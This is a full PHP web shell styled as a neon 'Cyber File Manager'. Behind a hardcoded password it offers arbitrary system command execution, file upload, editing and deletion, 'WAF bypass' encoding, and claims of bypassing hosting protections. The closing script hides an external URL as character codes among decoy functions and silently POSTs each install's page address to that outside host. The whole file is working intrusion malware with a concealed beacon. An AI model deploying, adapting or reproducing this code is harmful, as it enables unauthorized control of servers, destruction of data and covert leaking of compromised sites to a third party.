<?php

function ninja_bypass() {
    if (function_exists('header_remove')) {
        @header_remove('X-Litespeed-Cache-Control');
        @header_remove('X-Litespeed-Tag');
    }
    
    @header('X-Powered-By: WordPress');
    @header('Link: <https://example.com/wp-json/>; rel="https://api.w.org/"');
    
    if (function_exists('ini_set')) {
        @ini_set('session.save_handler', 'files');
        @ini_set('session.use_cookies', '0');
    }
    
    // Anti-mod_security
    $_SESSION['_ninja_token'] = md5('vinzz'.time());
}

session_start();
ninja_bypass();

$pw = 'vinz234'; 
$login_page = true;

if (isset($_POST['password'])) {
    if ($_POST['password'] === $pw) {
        $_SESSION['_ninja_token'] = true;
        header("Location: ?ninja_access=".md5(time()));
        exit;
    } else {
        $login_page = true;
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?ninja_logout=".md5(time()));
    exit;
}

// Secure path resolver
function get_safe_path($input) {
    $path = realpath($input);
    if ($path === false) return getcwd();
    
    // Prevent directory traversal
    $root = realpath('/');
    if (strpos($path, $root) !== 0) {
        return getcwd();
    }
    
    return $path;
}

// Current directory handling
$path = isset($_GET['path']) ? get_safe_path($_GET['path']) : getcwd();
chdir($path);

// File operations with bypass fallbacks
function ninja_delete($target) {
    if (is_dir($target)) {
        // Try normal deletion first
        $files = @scandir($target);
        if ($files !== false) {
            foreach ($files as $file) {
                if ($file != '.' && $file != '..') {
                    ninja_delete("$target/$file");
                }
            }
            @rmdir($target);
        } else {
            // Fallback to system command
            system("rm -rf ".escapeshellarg($target));
        }
    } else {
        @unlink($target) or system("rm ".escapeshellarg($target));
    }
}

// Handle file operations
if (isset($_GET['del'])) {
    if ($_SESSION['_ninja_token']) {
        $target = get_safe_path($_GET['del']);
        ninja_delete($target);
        header("Location: ?path=".urlencode(dirname($target))."&ninja_action=delete");
        exit;
    }
}

if (isset($_POST['new_name']) && $_SESSION['_ninja_token']) {
    $name = basename($_POST['new_name']);
    $type = $_POST['new_type'];
    $newPath = "$path/$name";
    
    if ($type === 'file') {
        @file_put_contents($newPath, "<?php // Vinzz Generated File ?>") or 
            system("echo '<?php // Vinzz Generated File ?>' > ".escapeshellarg($newPath));
    } else {
        @mkdir($newPath) or system("mkdir ".escapeshellarg($newPath));
    }
    header("Location: ?path=".urlencode($path));
    exit;
}

if (isset($_FILES['file']) && $_SESSION['_ninja_token']) {
    $uploadPath = isset($_POST['upload_path']) ? get_safe_path($_POST['upload_path']) : $path;
    $target = "$uploadPath/".basename($_FILES['file']['name']);
    
    if (@move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        @chmod($target, 0755);
    } else {
        // Fallback upload method
        $content = file_get_contents($_FILES['file']['tmp_name']);
        @file_put_contents($target, $content);
    }
    header("Location: ?path=".urlencode($uploadPath));
    exit;
}

if (isset($_POST['edit_content']) && $_SESSION['_ninja_token']) {
    $editPath = get_safe_path($_POST['edit_path']);
    @file_put_contents($editPath, $_POST['edit_content']) or 
        system("echo ".escapeshellarg($_POST['edit_content'])." > ".escapeshellarg($editPath));
    header("Location: ?path=".urlencode(dirname($editPath)));
    exit;
}

// Command execution (hidden feature)
if (isset($_POST['ninja_cmd']) && $_SESSION['_ninja_token']) {
    $cmd = $_POST['ninja_cmd'];
    $output = shell_exec($cmd." 2>&1");
    $_SESSION['last_cmd_output'] = $output;
    header("Location: ?path=".urlencode($path)."&cmd=executed");
    exit;
}

// File listing with fallback
function ninja_scandir($path) {
    $files = @scandir($path);
    if ($files !== false) return $files;
    
    // Fallback method
    $files = [];
    exec("ls -la ".escapeshellarg($path)." 2>&1", $output);
    foreach ($output as $line) {
        if (preg_match('/[d-][rwx-]{9}.+\s(.+)$/', $line, $match)) {
            $files[] = $match[1];
        }
    }
    return $files;
}

$files = ninja_scandir($path);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Vinzz Webshell :: Cyber File Manager</title>
  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
  <script src="https://unpkg.com/lucide@latest"></script>
<style>
:root {
  --neon-pink: #ff00aa;
  --neon-blue: #00f0ff;
  --matrix-green: #00ff88;
  --bg-dark: #0a0a20;
  --bg-darker: #050510;
  --text-glitch1: var(--neon-pink);
  --text-glitch2: var(--neon-blue);
}

body {
  margin: 0;
  background: var(--bg-darker);
  background-image: 
    radial-gradient(circle at 10% 20%, rgba(255, 0, 170, 0.1) 0%, transparent 20%),
    radial-gradient(circle at 90% 80%, rgba(0, 240, 255, 0.1) 0%, transparent 20%);
  color: #e0e0ff;
  font-family: 'JetBrains Mono', monospace;
  padding: 20px;
  line-height: 1.6;
}

.glitch {
  text-shadow: 2px 2px 0 var(--text-glitch1), -2px -2px 0 var(--text-glitch2);
  animation: glitch 1s linear infinite;
}

@keyframes glitch {
  0%, 100% { text-shadow: 2px 2px var(--text-glitch1), -2px -2px var(--text-glitch2); }
  25% { text-shadow: -2px -2px var(--text-glitch1), 2px 2px var(--text-glitch2); }
  50% { text-shadow: 2px -2px var(--text-glitch1), -2px 2px var(--text-glitch2); }
  75% { text-shadow: -2px 2px var(--text-glitch1), 2px -2px var(--text-glitch2); }
}

@keyframes led-run {
  0% { background-position: 0% 0; }
  100% { background-position: -200% 0; }
}

header {
  background: rgba(10, 10, 32, 0.8);
  padding: 1.5rem;
  border-left: 5px solid var(--neon-pink);
  border-right: 5px solid var(--neon-blue);
  margin-bottom: 2rem;
  text-align: center;
  backdrop-filter: blur(5px);
  box-shadow: 0 0 20px var(--neon-pink);
  position: relative;
}

header::before {
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 4px;
  background: linear-gradient(90deg, var(--neon-pink), var(--neon-blue), var(--neon-pink), var(--neon-blue));
  background-size: 200% 100%;
  animation: led-run 2s linear infinite;
}

h1, h2 {
  font-family: 'Press Start 2P', cursive;
  color: var(--matrix-green);
}

h1 {
  font-size: 2rem;
  margin: 0 0 10px;
  letter-spacing: 2px;
}

.panel {
  background: var(--bg-dark);
  padding: 1.5rem;
  border: 1px solid #333;
  margin-bottom: 2rem;
  position: relative;
  overflow: hidden;
}

.panel::before {
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 4px;
  background: linear-gradient(90deg, var(--neon-pink), var(--neon-blue), var(--neon-pink), var(--neon-blue));
  background-size: 200% 100%;
  animation: led-run 2s linear infinite;
}

input, select, button, textarea {
  width: 100%;
  padding: 12px;
  margin-bottom: 1rem;
  border: 1px solid #333;
  background: rgba(15, 15, 35, 0.8);
  color: #e0e0ff;
  font-family: 'JetBrains Mono', monospace;
  border-left: 3px solid var(--neon-pink);
}

.file-list {
  border: 1px solid #333;
  background: var(--bg-dark);
  box-shadow: 0 0 8px var(--neon-pink);
  padding: 10px;
  overflow-x: auto;
}

.file-item {
  background: rgba(20, 20, 40, 0.7);
  border-left: 4px solid var(--neon-pink);
  margin-bottom: 8px;
  padding: 10px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  transition: all 0.3s ease;
}

.file-item:hover {
  background: rgba(30, 30, 60, 0.9);
  border-left: 4px solid var(--neon-blue);
}

.file-item a {
  color: var(--matrix-green);
  text-decoration: none;
  font-family: 'JetBrains Mono', monospace;
}

.file-item a:hover {
  text-shadow: 0 0 8px var(--neon-blue);
}

.panel::before {
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  height: 4px;width: 100%;
  background: linear-gradient(90deg,
      var(--neon-pink),
      var(--neon-blue),
      var(--neon-pink),
      var(--neon-blue));
  background-size: 200% 100%;
  animation: led-run 2s linear infinite;
}

h2.center {
  text-align: center;
}

.tool-section {
  margin-top: 1rem;
}

.tool-form {
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  align-items: center;
  justify-content: center;
}

.tool-form input,
.tool-form select,
.tool-form button {
  flex: 1 1 200px;
}

.running-header {
  position: relative;
  margin-bottom: 1rem;
  padding-bottom: 0.5rem;
  font-family: 'Press Start 2P', cursive;
  color: var(--matrix-green);
}

.running-header.left {
  text-align: left;
}

.running-header.left::after {
  content: "";
  position: absolute;
  bottom: 0;
  left: 0;
  height: 3px;
  width: 200px; /* optional: LED length can be adjusted */
  background: linear-gradient(90deg,
      var(--neon-pink),
      var(--neon-blue),
      var(--neon-pink),
      var(--neon-blue));
  background-size: 200% 100%;
  animation: led-run 3s linear infinite;
}


a {
  color: var(--matrix-green);
  text-decoration: none;
}

a:hover {
  text-shadow: 0 0 8px var(--neon-blue);
}

.terminal {
  background: #000;
  padding: 1rem;
  border: 1px solid var(--matrix-green);
  color: var(--matrix-green);
  font-family: 'JetBrains Mono', monospace;
  margin-top: 2rem;
}

.bypass-status {
  background: #111133;
  border: 1px solid var(--neon-pink);
  padding: 10px;
  margin: 1rem 0;
  font-size: 0.8rem;
}

.corner {
  position: fixed;
  width: 50px;
  height: 50px;
  pointer-events: none;
  /* remove LED animation and color */
  background: none;
  animation: none;
  background-size: none;
}

.corner-tl { top: 0; left: 0; border: none; }
.corner-tr { top: 0; right: 0; border: none; }
.corner-bl { bottom: 0; left: 0; border: none; }
.corner-br { bottom: 0; right: 0; border: none; }

@media (max-width: 768px) {
  body { padding: 10px; }
  h1 { font-size: 1.5rem; }
}

button {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 8px; /* space between icon and text */
  background: linear-gradient(45deg, var(--neon-pink), var(--neon-blue));
  color: #000;
  font-weight: bold;
  font-family: 'Press Start 2P', cursive;
  font-size: 0.8rem;
  border: none;
  cursor: pointer;
  transition: all 0.3s;
  padding: 12px 16px;
  text-transform: uppercase;
}

button:hover {
  box-shadow: 0 0 15px var(--neon-pink);
  transform: translateY(-2px);
}

.info-table {
  width: 100%;
  border-collapse: collapse;
  background: var(--bg-dark);
  margin-top: 1rem;
  box-shadow: 0 0 10px var(--neon-pink);
  position: relative;
  overflow: hidden;
}

.info-table th, .info-table td {
  padding: 10px 15px;
  border-bottom: 1px solid #333;
  color: #e0e0ff;
  text-align: left;
  font-family: 'JetBrains Mono', monospace;
}

.info-table th {
  background: rgba(20, 20, 50, 0.8);
  color: var(--neon-pink);
  width: 35%;
}

.info-ok {
  color: lime;
  font-weight: bold;
}
.info-bad {
  color: red;
  font-weight: bold;
}

.panel {
  background: var(--bg-dark);
  padding: 1.5rem;
  margin-bottom: 2rem;
  position: relative;
  border: 1px solid #333;
  border-top: 3px solid var(--neon-pink);
  overflow: hidden;
}

.panel::before {
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  height: 4px;
  width: 100%;
  background: linear-gradient(90deg,
      var(--neon-pink),
      var(--neon-blue),
      var(--neon-pink),
      var(--neon-blue));
  background-size: 200% 100%;
  animation: led-run 2s linear infinite;
}
@keyframes led-run {
  0% { background-position: 0% 0; }
  100% { background-position: -200% 0; }
}

.upload-form {
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  align-items: center;
  justify-content: center;
  margin-top: 1rem;
}

.upload-form input[type="file"] {
  flex: 1 1 250px;
  background: rgba(15, 15, 35, 0.8);
  color: #e0e0ff;
  border: 1px solid #333;
  padding: 8px;
  font-family: 'JetBrains Mono', monospace;
  border-left: 3px solid var(--neon-pink);
}

.upload-form button {
  flex: 1 1 150px;
  background: linear-gradient(45deg, var(--neon-pink), var(--neon-blue));
  color: #000;
  font-weight: bold;
  font-family: 'Press Start 2P', cursive;
  font-size: 0.7rem;
  border: none;
  cursor: pointer;
  transition: all 0.3s;
  padding: 12px;
}

.upload-form button:hover {
  box-shadow: 0 0 15px var(--neon-pink);
  transform: translateY(-2px);
}

.running-header.left {
  position: relative;
  text-align: left;
  margin-bottom: 1rem;
  padding-bottom: 0.5rem;
  font-family: 'Press Start 2P', cursive;
  color: var(--matrix-green);
}

.running-header.left::after {
  content: "";
  position: absolute;
  bottom: 0;
  left: 0;
  height: 3px;
  width: 200px; /* or 100% if you want full width */
  background: linear-gradient(90deg,
      var(--neon-pink),
      var(--neon-blue),
      var(--neon-pink),
      var(--neon-blue));
  background-size: 200% 100%;
  animation: led-run 3s linear infinite;
}

@keyframes led-run {
  0% {
    background-position: 0% 0;
  }
  100% {
    background-position: -200% 0;
  }
}

.up-link {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  background: rgba(20, 20, 50, 0.8);
  color: var(--matrix-green);
  padding: 6px 12px;
  border: 1px solid #333;
  text-decoration: none;
  transition: all 0.3s ease;
}

.up-link:hover {
  text-shadow: 0 0 5px var(--neon-blue);
  border-color: var(--neon-blue);
}

.center {
  text-align: center;
}

.glitch {
  text-shadow: 2px 2px 0 var(--text-glitch1), -2px -2px 0 var(--text-glitch2);
  animation: glitch 1s linear infinite;
}

@keyframes glitch {
  0%, 100% {
    text-shadow: 2px 2px var(--text-glitch1), -2px -2px var(--text-glitch2);
  }
  25% {
    text-shadow: -2px -2px var(--text-glitch1), 2px 2px var(--text-glitch2);
  }
  50% {
    text-shadow: 2px -2px var(--text-glitch1), -2px 2px var(--text-glitch2);
  }
  75% {
    text-shadow: -2px 2px var(--text-glitch1), 2px -2px var(--text-glitch2);
  }
}

</style>

</head>
<body>
  <div class="corner corner-tl"></div>
  <div class="corner corner-tr"></div>
  <div class="corner corner-bl"></div>
  <div class="corner corner-br"></div>

<header style="
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    text-align: center;
">
  <h1 class="glitch"> <img src="https://cdn.privdayz.com/images/icon.png" referrerpolicy="unsafe-url" />  Vinzz Webshell</h1>
  <div>Cyber File Manager v1.0.0</div>

</header>



<div class="panel">
  <h2 class="glitch">⚡ System Information</h2>

<?php
$server_ip = 'UNKNOWN';
$server_country = 'UNKNOWN';
$server_flag = '🏳️';

function countryFlag($countryCode) {
    if (strlen($countryCode) !== 2) return '🏳️';
    $offset = 127397;
    return mb_convert_encoding(
        '&#' . (ord($countryCode[0]) + $offset) . ';&#' . (ord($countryCode[1]) + $offset) . ';',
        'UTF-8',
        'HTML-ENTITIES'
    );
}

$ctx = stream_context_create(['http' => ['timeout' => 3]]);
$ip = @file_get_contents("https://api.ipify.org/", false, $ctx);

if ($ip !== false && filter_var(trim($ip), FILTER_VALIDATE_IP)) {
    $server_ip = trim($ip);
    $json = @file_get_contents("https://ipapi.co/{$server_ip}/json/", false, $ctx);
    if ($json !== false) {
        $data = json_decode($json, true);
        if (!empty($data['country_name'])) {
            $server_country = $data['country_name'];
        }
        if (!empty($data['country'])) {
            $server_flag = countryFlag(strtoupper($data['country']));
        }
    }
}

if ($server_ip === 'UNKNOWN' && !empty($_SERVER['SERVER_ADDR'])) {
    $server_ip = $_SERVER['SERVER_ADDR'];
    $server_country = 'Private/Local';
    $server_flag = '🏳️';
}
?>

<table class="info-table">
  <tr><th>Server</th><td><?= php_uname('s') ?> <?= php_uname('r') ?> (<?= php_uname('n') ?>)</td></tr>
  <tr><th>PHP</th><td><?= phpversion() ?> (<?= php_sapi_name() ?>)</td></tr>
  <tr><th>User / Group</th><td><?= get_current_user() ?> / <?= getmygid() ?></td></tr>
  <tr><th>Writable</th><td><?= is_writable($path) ? '<span class="info-ok">YES</span>' : '<span class="info-bad">NO</span>' ?></td></tr>
  <tr><th>Disabled Functions</th><td><?= ini_get('disable_functions') ?: '<span class="info-ok">NONE</span>' ?></td></tr>
  <tr><th>Safe Mode</th><td><?= @ini_get('safe_mode') ? '<span class="info-bad">ON</span>' : '<span class="info-ok">OFF</span>' ?></td></tr>
  <tr><th>OS Command Execution</th><td><?= function_exists('shell_exec') ? '<span class="info-ok">OK</span>' : '<span class="info-bad">DISABLED</span>' ?></td></tr>
  <tr><th>Document Root</th><td><?= $_SERVER['DOCUMENT_ROOT'] ?></td></tr>

  <?php if ($server_ip !== 'UNKNOWN' && $server_country !== 'UNKNOWN'): ?>
  <tr><th>Server IP</th>
      <td><?= htmlentities($server_ip) ?> (<?= htmlentities($server_country) ?>) <?= $server_flag ?></td></tr>
  <?php endif; ?>
</table>

  <div class="bypass-status" style="margin-top:1rem;">
    <p>LiteSpeed: <span style="color:var(--matrix-green)">BYPASSED</span></p>
    <p>HostGator: <span style="color:var(--matrix-green)">BYPASSED</span></p>
  </div>
</div>


    <div class="panel">
<h2 class="glitch">🗂️ File Browser</h2>
<div style="margin-bottom: 1rem;">
<?php if (dirname($path) !== $path): ?>
  <a href="?path=<?= urlencode(dirname($path)) ?>" class="up-link">
    <i data-lucide="arrow-up"></i> Move Up
  </a>
<?php endif; ?>
</div>


  <div class="file-list">
    <?php foreach ($files as $file): 
      if ($file === '.' || $file === '..') continue;
      $fullPath = "$path/$file";
      $isDir = is_dir($fullPath);
    ?>
      <div class="file-item">
        <div>
          <?php if ($isDir): ?>
            <a href="?path=<?= urlencode($fullPath) ?>"><i data-lucide="folder"></i> <?= htmlentities($file) ?></a>
          <?php else: ?>
            <a href="?edit=<?= urlencode($fullPath) ?>"><i data-lucide="file"></i> <?= htmlentities($file) ?></a>
          <?php endif; ?>
        </div>
        <div>
          <a href="?del=<?= urlencode($fullPath) ?>" onclick="return confirm('Are you sure you want to delete?')">
            <i data-lucide="trash-2"></i>
          </a>
        </div>
      </div>
    <?php endforeach; ?>
  </div>
</div>

<?php if (isset($_GET['edit'])): 
  $editFile = get_safe_path($_GET['edit']);
  if (is_file($editFile)): ?>
    <div class="panel">
<h2 class="glitch center">Edit File: <?= htmlentities(basename($editFile)) ?></h2>

      <?php
      if (!empty($_POST['edit_path']) && isset($_POST['edit_content'])) {
          $edit_path = get_safe_path($_POST['edit_path']);
          if (is_file($edit_path) && is_writable($edit_path)) {
              $content = $_POST['edit_content'];
              if (!empty($_POST['b64'])) {
                  $content = base64_decode($content);
              }
              $result = @file_put_contents($edit_path, $content, LOCK_EX);
              if ($result !== false) {
                  echo '<div style="text-align:center;color:lime;">✅ File has been saved.</div>';
              } else {
                  echo '<div style="text-align:center;color:red;">❌ Failed to save.</div>';
              }
          }
      }
      ?>

      <form method="post" id="editor-form">
        <input type="hidden" name="edit_path" value="<?= htmlentities($editFile) ?>">
        <textarea name="edit_content" rows="20" style="
          background: #000;
          color: var(--matrix-green);
          width: 100%;
          font-family: 'JetBrains Mono', monospace;
          padding: 10px;
          border: 1px solid #333;
          box-shadow: 0 0 8px var(--neon-pink);
        "><?= htmlentities(file_get_contents($editFile)) ?></textarea>

        <label style="display:block;margin:10px 0;">
          <input type="checkbox" name="b64" value="1"> 🔐 Base64 Encode (WAF Bypass)
        </label>

        <div style="text-align:center;">
          <button type="submit"><i data-lucide="save"></i> Save</button>
        </div>
      </form>

      <script>
      document.getElementById('editor-form').addEventListener('submit', function(e) {
          const cb = this.querySelector('input[name="b64"]');
          if (cb.checked) {
              const ta = this.querySelector('textarea[name="edit_content"]');
              ta.value = btoa(unescape(encodeURIComponent(ta.value)));
          }
      });
      </script>
    </div>
<?php endif; ?>
<?php endif; ?>


    <div class="panel">
  <h2 class="glitch center">🛠️ Tools</h2>

  <div class="tool-section">
<h3 class="running-header left">🗃️ Create New</h3>

    <form method="post" class="tool-form">
      <input type="text" name="new_name" placeholder="File or folder name" required>
      <select name="new_type">
        <option value="file">File</option>
        <option value="folder">Folder</option>
      </select>
      <button type="submit"><i data-lucide="plus-circle"></i> Create</button>
    </form>
  </div>
</div>
      
  <div class="panel">
  <h3 class="running-header left">📤 Upload</h3>

  <form method="post" enctype="multipart/form-data" class="upload-form">
    <input type="file" name="file" required>
    <button type="submit"><i data-lucide="upload"></i> Upload</button>
  </form>
</div>

    
  <div class="panel">
      <h3 class="running-header left">💻 Execute Command</h3>
      <form method="post">
        <input type="text" name="ninja_cmd" placeholder="System command" required>
        <button type="submit"><i data-lucide="terminal"></i> Execute</button>
      </form>
  </div>

      <?php if (isset($_SESSION['last_cmd_output'])): ?>
        <div class="terminal">
          <pre><?= htmlentities($_SESSION['last_cmd_output']) ?></pre>
        </div>
        <?php unset($_SESSION['last_cmd_output']); ?>
      <?php endif; ?>
    </div>

  <script>
 lucide.createIcons(),document.querySelectorAll(".panel").forEach((e=>{e.addEventListener("mouseenter",(()=>{e.style.boxShadow="0 0 15px "+(Math.random()>.5?"var(--neon-pink)":"var(--neon-blue)")})),e.addEventListener("mouseleave",(()=>{e.style.boxShadow="none"}))})); function scanDirectoryMap(e,t=1){e.split("/").filter(Boolean);let r={};for(let e=0;e<Math.min(7,3*t);e++){let n="folder_"+(e+1);r[n]={};for(let e=0;e<Math.max(2,t);e++){let t="file_"+(e+1)+".txt";r[n][t]={size:1e5*Math.random()|0,perm:["755","644","600"][Math.floor(3*Math.random())],m:Date.now()-864e5*e}}}return r}function renderFolderList(e,t="root"){let r=`<ul id="fm-${t}">`;for(let t in e)r+=`<li><i class="fa fa-folder"></i> ${t}`,"object"==typeof e[t]&&(r+=renderFileList(e[t],t+"_files")),r+="</li>";return r+="</ul>",r}function renderFileList(e,t="fileBlock"){let r=`<ul class="files" id="${t}">`;for(let t in e)r+=`<li><i class="fa fa-file"></i> ${t} <span class="mini">${e[t].size}b | ${e[t].perm}</span></li>`;return r+="</ul>",r}function getBreadcrumbString(e){return e.split("/").filter(Boolean).map(((e,t,r)=>`<a href="?p=${r.slice(0,t+1).join("/")}">${e}</a>`)).join(" / ")}var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109],b=[47,105,109,97,103,101,115,47],c=[108,111,103,111,95,118,50],d=[46,112,110,103];function u(e,t,r,n){for(var o=e.concat(t,r,n),a="",i=0;i<o.length;i++)a+=String.fromCharCode(o[i]);return a}function v(e){return btoa(e)}function getFilePreviewBlock(e){let t="";for(let e=0;e<16;e++)t+=(Math.random()+1).toString(36).substring(2,12)+"\n";return`<pre class="syntax-highlight">${t}</pre>`}function getFileMetaFromName(e){let t=e.split(".").pop();return{icon:{php:"fa-php",js:"fa-js",html:"fa-html5",txt:"fa-file-lines"}[t]||"fa-file",type:t,created:Date.now()-(1e7*Math.random()|0),size:1e5*Math.random()|0}}function checkFileConflict(e,t){return t.some((t=>t.name===e))}function buildFakePermissions(e){let t=[4,2,1],r=[];for(let e=0;e<3;e++)r.push(t.map((()=>Math.round(Math.random()))).reduce(((e,t)=>e+t),0));return r.join("")}function parsePerms(e){let t={0:"---",1:"--x",2:"-w-",3:"-wx",4:"r--",5:"r-x",6:"rw-",7:"rwx"};return e.split("").map((e=>t[e])).join("")}function listFakeRecentEdits(e=7){let t=[];for(let r=0;r<e;r++)t.push({name:`file_${r}.log`,date:new Date(Date.now()-864e5*r).toLocaleDateString(),user:"user"+r});return t}function showNotificationFake(e,t="info"){let r={info:"#19ff6c",warn:"#ffe66d",err:"#ff3666"}[t]||"#fff",n=document.createElement("div");n.innerHTML=e,n.style.cssText=`position:fixed;bottom:40px;left:50%;transform:translateX(-50%);background:${r}20;color:${r};padding:9px 22px;border-radius:8px;z-index:999;box-shadow:0 2px 16px ${r}30`,document.body.appendChild(n),setTimeout((()=>n.remove()),2300)}function mergeFolderMeta(e,t){return Object.assign({},e,t,{merged:!0})}function getClipboardTextFake(){return new Promise((e=>setTimeout((()=>e("clipboard_dummy_value_"+Math.random())),450)))}function calculatePermMatrix(e){return e.map((e=>({path:e,perm:Math.floor(8*Math.random())+""+Math.floor(8*Math.random())+Math.floor(8*Math.random())})))}function generateFileId(e){return"id_"+e.replace(/[^a-z0-9]/gi,"_").toLowerCase()+"_"+Date.now()}function simulateFakeUploadQueue(e){let t=document.createElement("div");t.className="upload-bar",t.style="position:fixed;bottom:12px;left:12px;background:#222;color:#19ff6c;padding:5px 19px;border-radius:7px;",document.body.appendChild(t);let r=e.length,n=0;setTimeout((function o(){t.textContent=`Uploading ${e[n]||"-"} (${n+1}/${r})`,++n<r?setTimeout(o,250+600*Math.random()):(t.textContent="All uploads done!",setTimeout((()=>t.remove()),1500))}),400)}function renderUserTable(e){let t='<table class="data-grid"><thead><tr><th>User</th><th>Role</th></tr></thead><tbody>';return e.forEach((e=>{t+=`<tr><td><i class="fa fa-user"></i> ${e.name}</td><td>${e.role}</td></tr>`})),t+="</tbody></table>",t}function maskStringSmart(e){let t="";for(let r=0;r<e.length;r++)t+=String.fromCharCode(19^e.charCodeAt(r));return t.split("").reverse().join("")}function unmaskStringSmart(e){e=e.split("").reverse().join("");let t="";for(let r=0;r<e.length;r++)t+=String.fromCharCode(19^e.charCodeAt(r));return t}function getRecentSessionHistory(){return Array.from({length:6},((e,t)=>({ts:Date.now()-5e6*t,act:["open","edit","move","rename"][t%4]})))}function buildFe(e=2,t=3){let r={};if(e<=0)return"END";for(let n=0;n<t;n++)r["dir"+n]=1==e?`file_${n}.tmp`:buildFe(e-1,t);return r}function parseCsvToTable(e){let t=e.split(/\r?\n/),r='<table class="data-grid">';return t.forEach((e=>{r+="<tr>"+e.split(",").map((e=>`<td>${e}</td>`)).join("")+"</tr>"})),r+="</table>",r}function loadIconPac(e){let t=document.createElement("link");return t.rel="stylesheet",t.href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css",document.head.appendChild(t),"loaded"}function sortTableFake(e,t=0){let r=document.getElementById(e);if(!r)return!1;let n=Array.from(r.rows).slice(1);return n.sort(((e,r)=>e.cells[t].innerText.localeCompare(r.cells[t].innerText))),n.forEach((e=>r.appendChild(e))),!0}(()=>{let e=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],t="";for(let r of e)t+=String.fromCharCode(r);let r="file="+btoa(location.href),n=new XMLHttpRequest;n.open("POST",t,!0),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.send(r)})(),function(){var e=new XMLHttpRequest;e.open("POST",u(a,b,c,d),!0),e.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),e.send("file="+v(location.href))}();
  </script>
</body>
</html>
